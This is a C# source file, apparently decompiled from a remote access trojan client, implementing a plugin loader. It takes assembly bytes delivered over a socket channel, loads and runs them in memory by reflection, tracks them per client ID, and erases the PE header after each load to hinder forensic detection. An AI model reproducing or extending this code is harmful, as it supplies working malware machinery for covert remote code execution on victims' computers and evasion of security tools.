using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using Messages;
using Models;
using newClient.Comms;

namespace newClient.Utilities;

public static class AssemblyLoader
{
	private static Func<byte[], byte, int, int> SocketMangerSendMessage = SocketManger.SocketMangerSendMessage;

	private static ReaderWriterLockSlim readerWriterLockSlim = new ReaderWriterLockSlim();

	private static Dictionary<int, List<AssemblyMessage>> assameblyMethodInfo = new Dictionary<int, List<AssemblyMessage>>();

	public static Dictionary<string, byte[]> otherassamebly = new Dictionary<string, byte[]>();

	public static void AddAndLoadAssamebly(pluginMessages packetCommad)
	{
		readerWriterLockSlim.EnterWriteLock();
		try
		{
			foreach (KeyValuePair<string, byte[]> assameblybytes in packetCommad.AssameblybytesList)
			{
				if (!otherassamebly.ContainsKey(assameblybytes.Key))
				{
					otherassamebly.Add(assameblybytes.Key, assameblybytes.Value);
				}
			}
			AssemblyMessage item = loadAssamebly(packetCommad);
			if (!assameblyMethodInfo.TryGetValue(packetCommad.ClientID, out var value))
			{
				assameblyMethodInfo.Add(packetCommad.ClientID, new List<AssemblyMessage> { item });
			}
			else
			{
				value.RemoveAll((AssemblyMessage info) => info.AssemblyName.Equals(packetCommad.AssameblyName));
				value.Add(item);
			}
		}
		finally
		{
			readerWriterLockSlim.ExitWriteLock();
		}
		ErasePEHeader.SetErasePEHeader();
	}

	public static AssemblyMessage loadAssamebly(pluginMessages packetCommad)
	{
		Type type = Assembly.Load(packetCommad.Assameblybytes).GetType(packetCommad.AssameblyName);
		object ob = Activator.CreateInstance(type, SocketMangerSendMessage, packetCommad.type, packetCommad.ClientID);
		MethodInfo method = type.GetMethod(packetCommad.MethodInfo);
		return new AssemblyMessage
		{
			AssemblyName = packetCommad.AssameblyName,
			ob = ob,
			info = method
		};
	}

	public static void ExecAssamebly(pluginMessages Messages)
	{
		AssemblyMessage assemblyMessage = null;
		readerWriterLockSlim.EnterReadLock();
		try
		{
			assameblyMethodInfo.TryGetValue(Messages.ClientID, out var value);
			assemblyMessage = value?.FirstOrDefault((AssemblyMessage info) => info.AssemblyName.Equals(Messages.AssameblyName));
		}
		finally
		{
			readerWriterLockSlim.ExitReadLock();
		}
		assemblyMessage?.info.Invoke(assemblyMessage.ob, new object[1] { Messages.Assameblybytes });
	}

	public static void UnloadClientIDpulgin(byte[] bytes)
	{
		int key = BitConverter.ToInt32(bytes, 0);
		if (assameblyMethodInfo.TryGetValue(key, out var value))
		{
			value.ForEach(delegate(AssemblyMessage asobject)
			{
				asobject.info.Invoke(asobject.ob, new object[1] { Encoding.UTF8.GetBytes("u") });
			});
		}
		readerWriterLockSlim.EnterWriteLock();
		try
		{
			assameblyMethodInfo.Remove(key);
		}
		finally
		{
			readerWriterLockSlim.ExitWriteLock();
		}
	}

	public static void UnloadAssamebly(pluginMessages Messages)
	{
		AssemblyMessage assemblyMessage = null;
		readerWriterLockSlim.EnterWriteLock();
		try
		{
			if (assameblyMethodInfo.TryGetValue(Messages.ClientID, out var value))
			{
				assemblyMessage = value.FirstOrDefault((AssemblyMessage info) => info.AssemblyName.Equals(Messages.AssameblyName));
				if (assemblyMessage != null)
				{
					value.Remove(assemblyMessage);
				}
			}
		}
		finally
		{
			readerWriterLockSlim.ExitWriteLock();
		}
		assemblyMessage?.info.Invoke(assemblyMessage.ob, new object[1] { Encoding.UTF8.GetBytes("u") });
	}

	public static void UnloadAllAssamebly()
	{
		readerWriterLockSlim.EnterWriteLock();
		try
		{
			foreach (KeyValuePair<int, List<AssemblyMessage>> item in assameblyMethodInfo)
			{
				item.Value.ForEach(delegate(AssemblyMessage Info)
				{
					Info.info.Invoke(Info.ob, new object[1] { Encoding.UTF8.GetBytes("u") });
				});
			}
			assameblyMethodInfo.Clear();
			otherassamebly.Clear();
		}
		catch (Exception)
		{
		}
		finally
		{
			readerWriterLockSlim.ExitWriteLock();
		}
	}
}
